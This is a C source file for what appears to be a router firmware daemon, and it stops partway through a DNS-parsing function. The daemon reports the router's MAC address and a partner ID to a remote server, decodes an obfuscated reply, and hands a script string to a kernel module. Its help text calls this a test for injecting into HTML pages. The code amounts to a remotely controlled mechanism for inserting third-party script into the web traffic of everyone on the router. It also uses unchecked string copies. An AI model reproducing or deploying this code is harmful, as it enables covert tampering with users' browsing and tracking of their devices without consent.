/*
LAST MODIFY: 2016-11-29
*/

#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/types.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/if_arp.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <syslog.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
#if 0
#include <uci.h>
#endif
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/resource.h>
#include <limits.h>


#define NETLINK_USER 31
#define HTTP_PORT 80
#define MAX_PAYLOAD 1280 /* maximum payload size*/
#define USER_TO_KERNEL_BUFLEN 1000
#define MAX_RESPONSE_LINE_LENGTH 4096
#define MAC_ADDR_LEN 6
#define MAC_ADDR_STR_LEN 12
#define IP_ADDR_STR_LEN 20
#define IF_NAME_LEN 16

#define  RESOLVE_ADDR_ERROR -1
#define  SYSTEM_ERROR       -2
#define  PEER_CLOSED -3
#define  GET_VALUE_ERROR -4
#define  BAD_RESPONSE_HEADER -5
#define  RESPONSE_NOT_200 -6
#define  BAD_RESPONSE_BODY -7
#define  BAD_JS_STR -8
#define  SYSTEM_HTTP_HEADER_FINISH   -9
#define  SYSTEM_OK 0

/*macros and vars for js_update begin*/
#define JS_ADDRESS ("c.so9.cc")
#define JS_CONFIG_PATH ("/router/c/?t=%s&g=%s&v=%s&vr=%s&cv=%s&dv=%s")
#define DEVICE_TYPE ("X")
#define JS_REQ_CONFIG "GET %s HTTP/1.1\r\n\
Host: %s\r\n\
Accept: q=0\r\n\
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko)\r\n\
Accept-Encoding: q=0\r\n\
Connection: close\r\n\r\n"

#define JS_CODE_VERSION ("2")
#define VR_VERSION ("2")
#define CONFIG_FILE_VERSION ("2")

#define DNS_HOST  0x01
#define DNS_CNAME 0x05
#define DNS_CHECK_ADDRESS ("isalive.so9.cc")
#define DNS_CHECK_DEFAULT_INTERVAL 120

#define CONFIG_UPDATE_MEM_KEY 201336
#define INTERVAL 1
#define JS_STRING_LEN	256

typedef enum {
	NONE,
	ARP_UPDATE,
	JS_UPDATE,
	DNS_UPDATE
} MSG_TYPE;

typedef enum {
	TYPE_BEGIN = 0,
	TYPE_INT = 1,
	TYPE_STR = 2,
	TYPE_END
} VALUE_TYPE;

typedef struct{
	int Status;
	char IP[IP_ADDR_STR_LEN];
}DNSServerStatusMsgStruct;

typedef struct{
	unsigned int js_enable;
	unsigned int version;
	unsigned int interval;
	char server[IP_ADDR_STR_LEN];
	char js_str[JS_STRING_LEN];
}StatusInfoStruct;
static StatusInfoStruct l_dnsStatus;

static unsigned int top_switch=1;
static char * l_shmem=NULL;
static unsigned char l_macaddr[16]={0};
char save_js[256]={0};
static char l_router_partner_id[16];
static int l_server_update_flag = 0;
static int l_router_ip_valid;

#if 0
unsigned int get_value(char *pt)
{
	struct uci_context *c;
	struct uci_ptr p;
	unsigned int rev=0;
	char *a=strdup(pt);
	c=uci_alloc_context();
	if(UCI_OK != uci_lookup_ptr(c, &p, a, true))
	{
		uci_perror(c, "no found!\n");
		return 2;
	}
	rev = atoi(p.o->v.string);
	uci_free_context(c);
	free(a);
	return rev?1:0;
}
#endif

int is_valid_ip(const char *ip) 
{ 
	int section[4];  //每一节的十进制值 
	int dot = 0;       //几个点分隔符 

	section[0] = section[1] = section[2] = section[3] = 0;
	while(*ip)
	{ 
		if(*ip == '.')
		{ 
			dot++; 
			if(dot > 3)
			{ 
				return 0; 
			} 
			if(section[dot] >= 0 && section[dot] <=255)
			{ 
			}else{ 
				return 0; 
			} 
		}else if(*ip >= '0' && *ip <= '9'){ 
			section[dot] = section[dot] * 10 + *ip - '0'; 
		}else{
			return 0; 
		} 
		ip++;        
	}

	if(section[3] > 0 && section[3] <255)
	{ 
		if(3 == dot)
		{
			if(section[0]>0 && section[0]<=255)
				return 1;
			//printf ("IP address success!\n");       
			//printf ("%d\n",dot);
			return 0;
		}
	} 

	return 0; 
}

void replaceStr(char* strSrc, char* strFind, char* strReplace)
{
	while (*strSrc != '\0')
	{
		if (*strSrc == *strFind)
		{
			if (strncmp(strSrc, strFind, strlen(strFind)) == 0)
			{
				int i = strlen(strFind);
				int j = strlen(strReplace);
				char* q = strSrc+i;
				char* p = q;
				char* repl = strReplace;
				int lastLen = 0;
				char temp[512];
				int k;

				while (*q++ != '\0')
					lastLen++;
				for (k = 0; k < lastLen; k++)
				{
					*(temp+k) = *(p+k);
				}
				*(temp+lastLen) = '\0';
				while (*repl != '\0')
				{
					*strSrc++ = *repl++;
				}
				p = strSrc;
				char* pTemp = temp;
				while (*pTemp != '\0')
				{
					*p++ = *pTemp++;
				}
				*p = '\0';

				return;
			}
			else
				strSrc++;
		}
		else
			strSrc++;
	}
}

void sigroutine(int dunno)
{
	switch(dunno)
	{
	case 60:
		top_switch=0;
		js_send(top_switch);
		break;
	case 61:
		top_switch=1;
		js_send(top_switch);
		break;
	}
}

static void become_daemon(void)
{
	int pid;
	struct rlimit rl;

	if ((pid = fork()) < 0){
		printf("fork");
		_exit(EXIT_SUCCESS);	
	}
	if (pid)
		_exit(EXIT_SUCCESS);

	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	setsid();

	if (getrlimit(RLIMIT_NOFILE, &rl) < 0){
		printf("getrlimit");
		_exit(EXIT_SUCCESS);	
	}
	rl.rlim_cur = rl.rlim_max;
	setrlimit(RLIMIT_NOFILE, &rl);

	if (getrlimit(RLIMIT_CORE, &rl) < 0){
		printf("getrlimit");
		_exit(EXIT_SUCCESS);
	}
	rl.rlim_cur = rl.rlim_max;
	setrlimit(RLIMIT_CORE, &rl);
}

static int checkpidfile(char *pidfile)
{
	FILE *fp, *fd;
	char str[256];
	char PS_CMD[128], PID_Value[64];

	if (!(fp = fopen(pidfile, "r"))){
		if (!(fp = fopen(pidfile, "w"))){
			printf("%s", pidfile);
			_exit(EXIT_SUCCESS);
		}
		fprintf(fp, "%lu\n", (unsigned long)getpid());
		fclose(fp);
		return 1;
	}else{
		pid_t pid = -1;
		if(fgets(str, 255, fp) != NULL) {
			pid = atoi(str);
		}else{
			fprintf(fp, "%lu\n", (unsigned long)getpid());
			fclose(fp);
			return 1;
		}

		sprintf(PID_Value, "%d", pid);
		strcpy(PS_CMD, "ps|awk '{print $1}'|grep ");
		strcat(PS_CMD, PID_Value);
		if((fd = popen(PS_CMD, "r")) == NULL) {
			printf("call popen failed\n");
			return 0;
		} else {
			while(fgets(str, 255, fd) != NULL) {
				printf("%s\n",str);
				return 0;
			}
		}
	} 

	fclose(fp);
	if (!(fp = fopen(pidfile, "w"))){
		printf("%s", pidfile);
		_exit(EXIT_SUCCESS);
	}
	fprintf(fp, "%lu\n", (unsigned long)getpid());
	fclose(fp);
	return 1;
}

void exit_cleanup(int signo)
{
	_exit(EXIT_SUCCESS);
}

void sendDNSmsg(int sw, char *addr)
{
	DNSServerStatusMsgStruct msg;
	memset(&msg,0,sizeof(DNSServerStatusMsgStruct));

	msg.Status = sw;
	memcpy(msg.IP, addr,strlen(addr));

	memcpy(l_shmem,&msg,sizeof(DNSServerStatusMsgStruct));
}

void updateJSStatusTask(void)
{
	unsigned int i=0;
	int res=0,retval=0;

#if 0
	retval=get_value("jsprocess.config.ignore");
	top_switch=retval?0:1;
#else
	top_switch = 1;
#endif
	res=js_init();
	if(SYSTEM_OK!=res)
	{
		syslog(LOG_INFO,"init error");
		return;
	}
	while(1)
	{
		if(i%30==0)//updata js,dns_server every hour
		{
			res=config_update();
			if(res==SYSTEM_OK)
			{
				js_update();

				if(l_router_ip_valid)
				{
					res=check_dns_server();//check dns_server every minute
					if((res==RESOLVE_ADDR_ERROR))
					{
						sendDNSmsg(0, l_dnsStatus.server);
					}
					else if((res==SYSTEM_OK))
					{
						sendDNSmsg(top_switch, l_dnsStatus.server);
					}
				}
				break;
			}
		}

		i++;
		sleep(INTERVAL);
	}

	while(1)
	{
		if(i%3600==0)//updata js,dns_server every hour
		{
			res=config_update();
			if(res==SYSTEM_OK)
			{
				js_update();
				sleep(60);//sleep to make sure dnsmasq finish update
			}
			if(res!=SYSTEM_OK)
			{
				//js_send(top_switch);
				js_send(0);
			}
		}
		if(i%l_dnsStatus.interval==0)
		{
			if(l_server_update_flag)
			{
				if(l_router_ip_valid)
				{
					res=check_dns_server();//check dns_server every minute
					if((res==RESOLVE_ADDR_ERROR))
					{
						sendDNSmsg(0, l_dnsStatus.server);
					}
					else if((res==SYSTEM_OK))
					{
						sendDNSmsg(top_switch, l_dnsStatus.server);
					}
				}
			}
		}
		i++;
		sleep(INTERVAL);
	}
	shmdt(l_shmem);
	return;
}

void main(int argc, char *argv[])
{
	unsigned int i=0;
	int res=0, retval=0;
	int exitflag = 0;

	memset(&l_dnsStatus, 0, sizeof(StatusInfoStruct));
	l_dnsStatus.interval = DNS_CHECK_DEFAULT_INTERVAL;

	signal(SIGHUP,	exit_cleanup);
	signal(SIGUSR1, exit_cleanup);
	signal(SIGUSR2, exit_cleanup);
	signal(SIGALRM, exit_cleanup);
	signal(SIGINT,  exit_cleanup);
	signal(SIGQUIT, exit_cleanup);
	signal(SIGABRT, exit_cleanup);
	signal(SIGTERM, exit_cleanup);

	signal(60,sigroutine);
	signal(61,sigroutine);

	memset( l_router_partner_id, 0, sizeof(l_router_partner_id) );
	for(i=1; i<argc; i++)
	{
		if(strcmp(argv[i], "-h") == 0)
		{
			printf("\nUsage : %s -b -id <ROUTER-PARTNER-ID> \n" , argv[0]);
			printf("Please send mail to: rom-support@veryci.com to get your ROUTER-PARTNER-ID\n");
			printf("ROUTER-IP-ADDRESS: your NEW-ROM router's ip address, NEW-ROM means build with Cloud Of Things Router Module (jsprocess.c + js.c + dnsmasq)\n");
			printf("Inject Test HTML URL: http://rpip.cot9.cc/test.html\n\n\n");
			return;
		} if(strcmp(argv[i],"-b") == 0){
			become_daemon();
		} else if(strcmp(argv[i],"-pid") == 0){
			if(!checkpidfile(argv[i+1]))
        		return;
			i++;
        } else if(strcmp(argv[i],"-id") == 0){
			if( sizeof(l_router_partner_id)-1 < strlen(argv[i+1]) ){
				printf( "ROUTER-PARTNER-ID is too long, max length is: %d\n", sizeof(l_router_partner_id)-1 );
				return;
			}else{
				strcpy( l_router_partner_id, argv[i+1] );
				exitflag = exitflag + 1;
			}
			i++;
		}else if(strcmp(argv[i],"-enable") == 0){
			top_switch=1;
			js_send(top_switch);
		}else if(strcmp(argv[i],"-disable") == 0){
			top_switch=0;
			js_send(top_switch);
		}else if(strcmp(argv[i],"-net") == 0){
            exitflag = exitflag + 2;
			_get_mac(argv[i+1]);
			i++;
        }
	}

	if(exitflag != 3)
	{
		if(exitflag == 1)
		{
			printf("Load parameter -net, pls\r\n");
			return;
		}
		else if(exitflag == 2)
		{
			printf("Load parameter -id, pls\r\n");
			return;
		}
		else if(exitflag == 0)
		{
			printf("Load parameter -net -id, pls\r\n");
			return;
		}
		else
		{
			return;
		}
	}

	if(strlen(l_router_partner_id) == 0){
		printf("Set ID first,please. \n");
		return;
	}

	updateJSStatusTask();

	return;
}

void get_dns_dest(struct sockaddr_in *dest)
{
	bzero(dest , sizeof(struct sockaddr_in));
	dest->sin_family = AF_INET;
	dest->sin_port = htons(53);
	dest->sin_addr.s_addr = inet_addr(l_dnsStatus.server);
}

int check_dns_server(void)
{
	int dnssocketfd;
	int sendlen=0;
	struct hostent *he;
	struct in_addr *in_addr_temp;
	int res=0;
	int nfds;
	fd_set readfds;
	struct timeval timeout;
	unsigned char dns_check_result[IP_ADDR_STR_LEN]={0};

	dnssocketfd = socket(AF_INET , SOCK_DGRAM , 0);
	if(dnssocketfd < 0){
		perror("create socket failed");
	}

	sendlen=send_dns_request(dnssocketfd, DNS_CHECK_ADDRESS);
	if(0 == sendlen)
	{
		return RESOLVE_ADDR_ERROR;
	}

	FD_ZERO(&readfds);
	FD_SET(dnssocketfd,&readfds);
	timeout.tv_sec=5;
	timeout.tv_usec=0;
	nfds=dnssocketfd+1;
	res=select(nfds,&readfds,NULL,NULL,&timeout);
	if(res < 0)
	{
		close(dnssocketfd);
		return RESOLVE_ADDR_ERROR;
	}
	if(res == 0)
	{
		close(dnssocketfd);
		return RESOLVE_ADDR_ERROR;
	}
	else
	{
		memset(dns_check_result,0,sizeof(dns_check_result));
		parse_dns_response(dnssocketfd, dns_check_result);
		if(!strlen(dns_check_result))
		{
			close(dnssocketfd);
			return RESOLVE_ADDR_ERROR;
		}
	}

	close(dnssocketfd);
	return SYSTEM_OK;

}

int substr( char* inbuf, char* begin, char* end, char* outbuf )
{
	char* p1 = NULL;
	char* p2 = NULL;

	if( !inbuf || !outbuf )
		return SYSTEM_ERROR;

	if( begin ){
		p1 = strstr( inbuf, begin );
		if( NULL == p1 ){
			return SYSTEM_ERROR;
		}
		p1 += strlen( begin );
	}

	if( end ){
		if( NULL == begin ){
			p2 = strstr( inbuf, end );
		}else{
			p2 = strstr( p1, end );
		}
		if( NULL == p2 ){
			return SYSTEM_ERROR;
		}
	}

	if( p2 <= p1 ){
		return SYSTEM_ERROR;
	}
	memcpy( outbuf, p1, ( p2 - p1 ) );
	return SYSTEM_OK;
}

int http_client_get_response_code( char* buf ){
	int rtn;
	char outbuf[10];
	memset( outbuf, '\0', sizeof(outbuf) );
	rtn = substr( buf, " ", " ", outbuf );
	if( SYSTEM_ERROR == rtn )
		return SYSTEM_ERROR;
	return atol( outbuf );
}

int http_client_get_content_length( char* buf ){
	int rtn = SYSTEM_ERROR;
	char outbuf[10];
	memset(outbuf, 0, sizeof(outbuf));
	rtn = substr( buf, "Content-Length: ", "\r\n", outbuf );
	if( SYSTEM_OK == rtn ){
		return atol( outbuf );
	}
	return SYSTEM_ERROR;
}

int socket_read_line( int fd, char *buffer, int size ){
	char next = '\0';
	int err;
	int i = 0;
	while ((i < (size - 1)) && (next != '\n')){
		err = recv(fd, &next, 1,0);
		if (err < 0){
			if( EAGAIN == errno ){
				continue;
			}else{
				printf("ERROR: have error while read http response: errno=%d error msg: %s", errno, strerror(errno));
				break;
			}
		}
		buffer[i] = next;
		i++;

		if( '\r' == next ){
			err = recv(fd, &next, 1, MSG_PEEK);
			if( 0 < err && '\n' == next ){
				recv(fd, &next, 1,0);
				buffer[i]=next;
				i++;
			}else{
				next = '\n';
			}
		}
	}
	buffer[i] = '\0';
	return i;
}


int socket_read_http_header( int sockfd, char* buffer, int buflen, int* add_len ){
	int readlen        = 0;
	char line[1024];
	memset( line, 0, sizeof(line) );
	while( 1 ){
		readlen = socket_read_line( sockfd, line, sizeof(line) );
		if( readlen <= 0 ){
			return SYSTEM_ERROR;
		}else{
			*add_len += readlen;
			memcpy( buffer, line, strlen(line) );
			if( 0 == strncmp( line, "\r\n", 2 ) ){
				return SYSTEM_HTTP_HEADER_FINISH;
			}
		}
		buffer += strlen(line);
		memset( line, 0, sizeof(line) );
	}
	return SYSTEM_OK;
}

int get_value_by_key(const char * str,
	const char * splitstr,
	const char * key,
	VALUE_TYPE type,
	void* value)
{
	char * char_p=NULL;
	char * char_q=NULL;
	int j=0;
	int i=0;
	char tmpvalue[32]={0};
	int intvalue;
	char_p=strcasestr(str,key);
	if(!char_p)
	{
		return SYSTEM_ERROR;
	}
	char_p+=strlen(key);

	char_p=strcasestr(char_p,splitstr);
	if(!char_p)
	{
		return SYSTEM_ERROR;
	}

	char_p=char_p+strlen(splitstr);

	char_q=strchr(char_p,'\r');
	if(!char_q)
	{
		return SYSTEM_ERROR;
	}

	if(type==TYPE_INT)
	{
		/*trim*/
		for(j=0;j<char_q-char_p;j++)
		{
			if(!isspace(char_p[j]))
			{
				tmpvalue[i]=char_p[j];
				i++;
			}
		}
		intvalue=atoi(tmpvalue);
		*(int*)value=intvalue;
	}

	if(type==TYPE_STR)
	{
		/*ltrim*/
		for(j=0;j<char_q-char_p;j++)
		{
			if(isspace(char_p[j]))
			{
				i++;
			}
			else
			{
				break;
			}
		}
		char_p+=i;
		memcpy((char*)value,char_p,char_q-char_p);
	}

	return SYSTEM_OK;
}


int parse_update_file(const char *data)
{
	int res=0;

	res=get_value_by_key(data,"=","js-enable",TYPE_INT,&l_dnsStatus.js_enable);
	if(res!=SYSTEM_OK)
	{
		return SYSTEM_ERROR;
	}
	memset(l_dnsStatus.js_str, 0, sizeof(l_dnsStatus.js_str));
	res=get_value_by_key(data,"=","js-str",TYPE_STR,l_dnsStatus.js_str);
	if(res!=SYSTEM_OK)
	{
		return SYSTEM_ERROR;
	}

	res=get_value_by_key(data,"=","ver",TYPE_INT,&l_dnsStatus.version);
	if(res!=SYSTEM_OK)
	{
		return SYSTEM_ERROR;
	}
	memset(l_dnsStatus.server, 0, sizeof(l_dnsStatus.server));
	res=get_value_by_key(data,"=","dsrv",TYPE_STR,l_dnsStatus.server);
	if(res!= SYSTEM_OK)
	{
		return SYSTEM_ERROR;
	}
	l_router_ip_valid = is_valid_ip(l_dnsStatus.server);

	res=get_value_by_key(data,"=","dns-chk-interval",TYPE_INT,&l_dnsStatus.interval);
	if(res!=SYSTEM_OK)
	{
		l_dnsStatus.interval=DNS_CHECK_DEFAULT_INTERVAL;
	}
	else
	{
		if((l_dnsStatus.interval<60)||(l_dnsStatus.interval>3600*24))
		{
			l_dnsStatus.interval=DNS_CHECK_DEFAULT_INTERVAL;
		}
	}

	return SYSTEM_OK;
}

/*key:input parameter,value is mac's confusion*/
int js_decode_by_key(const char *key,char * result,int keylen)
{
	int resultlen=0;
	int i,j;
	unsigned char p,q; 
	if((NULL == key)||(NULL == result))
	{
		return -1;
	}
	resultlen=strlen(result);

	for(i=0;i<resultlen;i++)
	{
		p=result[i];
		q=key[i%keylen];
		if(p < q)
		{
			p+=256-q;
			result[i]=p;
		}
		else
		{
			result[i]=p-q;
		}
	}
	return 0;
}


/*key:input parameter for confusion,value is router mac
result:confusion result*/
int js_mac_confusion(const char *key,char * result)
{
	unsigned char p,q;
	int len = 0;
	int j=0;
	unsigned char mac_addr_confuse[16]={0}; 

	if ((NULL == key) || (NULL == result))
	{
		return -1;
	}

	len=strlen(key);
	strcpy(mac_addr_confuse,key+1);
	mac_addr_confuse[len-1]=l_macaddr[0];
	for(j=0;j<len;j++)
	{
		p=key[j];
		q=mac_addr_confuse[j];
		result[j]=p^q;
	}	

	return 0;
}

int config_update(void)
{
	char buffer[1024]={0};
	char parameter[128]={0};
	int sock_update=-1;//socket to server
	struct sockaddr_in server_addr;
	struct in_addr server_ip={0};
	int res=0;
	fd_set readfds;
	fd_set writefds;
	struct timeval timeout;
	int nfds;
	int rcvlen=0;
	struct hostent *he;
	struct in_addr *in_addr_temp;
	int sent=0;
	int nbytes=0;
	int totalsend = 0;
	int readlen=0;
	unsigned int isSent=0;
	char mac_key[40] = {0};
	
	int http_header_is_end   = 0;
	int http_response_code;
	int http_content_length;
	int total_read_len = 0;
	int add_len;

	/*init sock_update*/
	sock_update=socket(AF_INET,SOCK_STREAM,0);
	if(sock_update<0)
	{
		printf("create sock error\n");
		return SYSTEM_ERROR;
	}
	//set socket non-block
	fcntl(sock_update,F_SETFL,fcntl(sock_update,F_GETFL)|O_NONBLOCK);

	he=gethostbyname(JS_ADDRESS);
	if(he==NULL)
	{
		close(sock_update);
		return RESOLVE_ADDR_ERROR;
	}
	in_addr_temp=(struct in_addr*)he->h_addr_list[0];

	server_ip.s_addr=(in_addr_temp->s_addr);

	server_ip.s_addr=(server_ip.s_addr);
	server_addr.sin_addr=server_ip;
	server_addr.sin_family=AF_INET;
	server_addr.sin_port=htons(HTTP_PORT);
	res=connect(sock_update,(struct sockaddr*)&server_addr,sizeof(struct sockaddr));
	if(res==-1)
	{
		if(errno != EINPROGRESS)
		{
			printf("connect server error :%d %s\n",errno,strerror(errno));
			close(sock_update);
			return SYSTEM_ERROR;
		}
	}

	while(1)
	{
		FD_ZERO(&readfds);
		FD_SET(sock_update,&readfds);
		FD_ZERO(&writefds);
		FD_SET(sock_update,&writefds);
		timeout.tv_sec=5;
		timeout.tv_usec=0;

		nfds=sock_update+1;
		res=select(nfds,&readfds,&writefds,NULL,&timeout);
		if(res < 0)
		{
			close(sock_update);
			return SYSTEM_ERROR;
		}
		if(res == 0)
		{
			continue;
		}

		if(FD_ISSET(sock_update, &writefds))
		{
			if(0==isSent)
			{
				snprintf(parameter,sizeof(parameter)-1,
					JS_CONFIG_PATH,l_router_partner_id,l_macaddr,
					JS_CODE_VERSION,VR_VERSION,CONFIG_FILE_VERSION,
					DEVICE_TYPE);
				snprintf(buffer,sizeof(buffer)-1,JS_REQ_CONFIG,parameter,JS_ADDRESS);
				//snprintf(buf,sizeof(buf)-1,REQ_CONFIG);
				nbytes=strlen(buffer);
				while(totalsend < nbytes)
				{
					sent = send(sock_update,buffer+totalsend, nbytes - totalsend,0);
					if(sent==-1)
					{
						printf("send error %d",errno);
						close(sock_update);
						return SYSTEM_ERROR;
					}
					totalsend+=sent;
				}
				isSent=1;
			}
		}
		if(0==isSent)
		{
			continue;
		}

		if(FD_ISSET(sock_update, &readfds))
		{			
			if( 0 == http_header_is_end ){
				res = socket_read_http_header( sock_update, buffer,
					sizeof(buffer)-total_read_len, &add_len );
				if( SYSTEM_ERROR == res ){
					close( sock_update );
					return res;
				}

				total_read_len += add_len;
				if( SYSTEM_HTTP_HEADER_FINISH == res ){
					http_header_is_end  = 1;
					http_response_code  = http_client_get_response_code( buffer );
					http_content_length = http_client_get_content_length( buffer );
					total_read_len = 0;
					memset( buffer, '\0', sizeof(buffer) );
				}
			} 

			if( 1 == http_header_is_end ){
				res = recv( sock_update,buffer + total_read_len, http_content_length * sizeof(char) - total_read_len, 0 );  
				if( -1 == res ){
					printf( "ERROR: while read http body %d/%d, errno=%d, error msg: %s", 
						total_read_len, http_content_length, errno, strerror(errno) ); 
					close( sock_update );
					return SYSTEM_ERROR;
				}

				total_read_len += res; 
				if( total_read_len == http_content_length ){
					js_mac_confusion(l_macaddr,mac_key);
					js_decode_by_key(mac_key,buffer,strlen(l_macaddr));

					res = parse_update_file(buffer);
					if(SYSTEM_OK==res)
					{
						l_server_update_flag = 1;
						close(sock_update);
						return SYSTEM_OK;
					}
					else
					{
						l_server_update_flag = 0;
						close(sock_update);
						return BAD_RESPONSE_BODY;
					}
					break;
				}
			}
		}
	}
}


int _get_mac(unsigned char *if_name)
{
	struct ifreq ifr;
	int ret = 0;
	int soc;
	unsigned char mac_addr_tmp[MAC_ADDR_LEN]={0};

	if ((soc = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	{
		memcpy(l_macaddr, "aabbccddeeff", MAC_ADDR_STR_LEN);
		return ret;
	}
	strncpy(ifr.ifr_name, if_name, IF_NAME_LEN);
	if ((ret = ioctl(soc, SIOCGIFHWADDR, &ifr)) < 0)
	{
		close(soc);
		memcpy(l_macaddr, "aabbccddeeff", MAC_ADDR_STR_LEN);
		return ret;
	}

	close(soc);

	memcpy(mac_addr_tmp, &ifr.ifr_hwaddr.sa_data, MAC_ADDR_LEN);

	sprintf(l_macaddr,"%02x%02x%02x%02x%02x%02x",mac_addr_tmp[0],mac_addr_tmp[1],mac_addr_tmp[2],mac_addr_tmp[3],mac_addr_tmp[4],mac_addr_tmp[5]);
	return ret;
}


int js_init()
{
	int shmid=0;

	//_get_mac("wlan0");

	shmid=shmget(CONFIG_UPDATE_MEM_KEY,sizeof(DNSServerStatusMsgStruct),IPC_CREAT|0777);
	if(shmid>=0)
	{
		l_shmem=(char*)shmat(shmid,NULL,0);
		if(!l_shmem)
		{
			printf("shmat error  %d\n",errno);
			return SYSTEM_ERROR;
		}
	}
	else
	{
		syslog(LOG_ERR,"shmget: error errno=%u(%s)\n", errno, strerror(errno));

		printf("create or read shm err %d %d\n",shmid,errno);
		return SYSTEM_ERROR;
	}

	return SYSTEM_OK;
}

int js_str_format(char* buffer, const char * js)
{
	strcpy(buffer, js);

	replaceStr(buffer, "%ROM-VERSION%", JS_CODE_VERSION);
	replaceStr(buffer, "%ROUTER-MAC-ADDR%", l_macaddr);
	//replaceStr(buffer, "%CLIENT-MAC-ADDR%", "000000000000");

	memset(save_js, 0, sizeof(save_js));
	strcpy(save_js, buffer);

	return strlen(buffer);
}

void netlinkSend(char *data, int len)
{
	struct iovec iov;
	struct msghdr msg;
	struct nlmsghdr *nlh = NULL;

	nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
	memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
	nlh->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
	nlh->nlmsg_pid = getpid();
	nlh->nlmsg_flags = 0;
	nlh->nlmsg_type=JS_UPDATE;
	memcpy((NLMSG_DATA(nlh)), data, len);

	memset(&iov, 0, sizeof(iov));
	iov.iov_base = (void *)nlh;
	iov.iov_len = nlh->nlmsg_len;

	memset(&msg, 0, sizeof(msg));
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	int sock_fd;//socket to kernel
	struct sockaddr_nl src_addr;
	sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_USER);
	if (sock_fd < 0)
		return;

	memset(&src_addr, 0, sizeof(src_addr));
	src_addr.nl_family = AF_NETLINK;
	//src_addr.nl_pid = getpid(); /* self pid */
	src_addr.nl_pid =0;
	src_addr.nl_groups = 0;
	bind(sock_fd, (struct sockaddr *)&src_addr, sizeof(src_addr));

	sendmsg(sock_fd, &msg, 0);
	close(sock_fd);  
	return;
}

void js_update()
{
	char kernelBuffer[USER_TO_KERNEL_BUFLEN];
	unsigned int js_val = top_switch?l_dnsStatus.js_enable:0;
	int len=0; 

	memset(kernelBuffer,0,USER_TO_KERNEL_BUFLEN);
	memcpy(kernelBuffer, &js_val, sizeof(js_val));

	len=js_str_format(kernelBuffer+4,l_dnsStatus.js_str);
	if(len==BAD_JS_STR)
	{
		return;
	}

	netlinkSend(kernelBuffer,sizeof(js_val)+len);

	return;
}

int js_send(unsigned int js_en)
{
	char kernelBuffer[USER_TO_KERNEL_BUFLEN];
	int len=0;
	
	if(strlen(save_js) == 0)
	{
		return 0;
	}

	memset(kernelBuffer,0,USER_TO_KERNEL_BUFLEN);
	memcpy(kernelBuffer, &js_en, sizeof(js_en));
	len = strlen(save_js);
	memcpy(kernelBuffer+4,save_js, len);

	netlinkSend(kernelBuffer,sizeof(js_en)+len);

	return 1;
}

/*dns query*/
int send_dns_request(int sockfd, const char *dns_name)
{
	struct sockaddr_in dest;
	unsigned char request[256]={0};
	unsigned char *ptr = request;
	unsigned char question[128]={0};
	int question_len;
	int len;

	generate_question(dns_name , question , &question_len);
	*((unsigned short*)ptr) = htons(0xff00);
	ptr += 2;
	*((unsigned short*)ptr) = htons(0x0100);
	ptr += 2;
	*((unsigned short*)ptr) = htons(1);
	ptr += 2;
	*((unsigned short*)ptr) = 0;
	ptr += 2;
	*((unsigned short*)ptr) = 0;
	ptr += 2;
	*((unsigned short*)ptr) = 0;
	ptr += 2;
	memcpy(ptr , question , question_len);
	ptr += question_len;

	get_dns_dest(&dest);
	len = sendto(sockfd , request , 
		question_len + 12 , 0,
		(struct sockaddr*)&dest ,
		sizeof(struct sockaddr));
	if(len > 0)
		return 1;

	return 0;
}


void generate_question(const char *dns_name , unsigned char *buf , int *len)
{
	char *pos;
	unsigned char *ptr;
	int n;
	*len = 0;
	ptr = buf;
	pos = (char*)dns_name;
	for(;;){
		n = strlen(pos) - (strstr(pos , ".") ? strlen(strstr(pos , ".")) : 0);
		*ptr ++ = (unsigned char)n;
		memcpy(ptr , pos , n);
		*len += n + 1;
		ptr += n;
		if(!strstr(pos , ".")){
			*ptr = (unsigned char)0;
			ptr ++;
			*len += 1;
			break;
		}
		pos += n + 1;
	}
	*((unsigned short*)ptr) = htons(1);
	*len += 2;
	ptr += 2;
	*((unsigned short*)ptr) = htons(1);
	*len += 2;
}

void parse_dns_name(unsigned char *chunk, 
	unsigned char *ptr , 
	char *out ,
	int *len)
{
	int n , alen , flag;
	char *pos = out + (*len);
	for(;;){
		flag = (int)ptr[0];
		if(flag == 0)
			break;
		if(is_pointer(flag)){
			n = (int)ptr[1];
			ptr = chunk + n;
			parse_dns_name(chunk , ptr , out , len);
			break;
		}else{
			ptr ++;
			memcpy(pos , ptr , flag);
			pos += flag;
			ptr += flag;
			*len += flag;
			if((int)ptr[0] != 0){
				memcpy(pos , "." , 1);
				pos += 1;
				(*len) += 1;
			}
		}
	}
}

int is_pointer(int in)
{
	return ((in & 0xc0) == 0xc0);
}

void parse_dns_response(int sockid, char *result)
{
	unsigned char dnsbuf[1024]={0};
	unsigned char *ptr = dnsbuf;
	struct sockaddr_in addr;
	char *src_ip;
	int n , i , flag , querys , answers;
	int type , ttl , datalen , len;
	char cname[128]={0};
	char aname[128]={0};
	char *cname_ptr;
	unsigned char netip[4];

	size_t addr_len = sizeof(struct sockaddr_in);
	n = recvfrom(sockid , dnsbuf , sizeof(dnsbuf) , 0, (struct sockaddr*)&addr , &addr_len);
	ptr += 4; /* move ptr to Questions */
	querys = ntohs(*((unsigned short*)ptr));
	ptr += 2; /* move ptr to Answer RRs */
	answers = ntohs(*((unsigned short*)ptr));
	ptr += 6; /* move ptr to Querys */
	/* move over Querys */
	for(i= 0 ; i < querys ; i ++)
	{
		for(;;)
		{
			flag = (int)ptr[0];
			ptr += (flag + 1);
			if(flag == 0)
				break;
		}
		ptr += 4;
	}
	/* now ptr points to Answers */
	for(i = 0 ; i < answers ; i ++){
		bzero(aname , sizeof(aname));
		len = 0;
		parse_dns_name(dnsbuf , ptr , aname , &len);
